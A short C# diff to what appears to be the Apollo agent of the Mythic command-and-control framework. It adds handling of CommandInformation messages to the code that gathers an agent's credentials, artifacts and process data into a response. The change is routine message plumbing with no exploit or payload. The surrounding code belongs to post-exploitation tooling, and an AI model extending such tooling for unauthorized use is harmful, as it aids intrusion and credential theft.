@@ -52,10 +52,14 @@ namespace ApolloInterop.Classes
                 List<RemovedFileInformation> removed = new List<RemovedFileInformation>();
                 List<Artifact> artifacts = new List<Artifact>();
                 List<ProcessInformation> processes = new List<ProcessInformation>();
+                List<CommandInformation> cmds = new List<CommandInformation>();
                 foreach (IMythicMessage msg in messages)
                 {
                     switch (msg.GetTypeCode())
                     {
+                        case MessageType.CommandInformation:
+                            cmds.Add((CommandInformation)msg);
+                            break;
                         case MessageType.EdgeNode:
                             edges.Add((EdgeNode)msg);
                             break;
@@ -88,6 +92,7 @@ namespace ApolloInterop.Classes
                 resp.Credentials = creds.ToArray();
                 resp.RemovedFiles = removed.ToArray();
                 resp.Artifacts = artifacts.ToArray();
+                resp.Commands = cmds.ToArray();
                 if (processes.Count > 0)
                 {
                     resp.Processes = processes.ToArray();
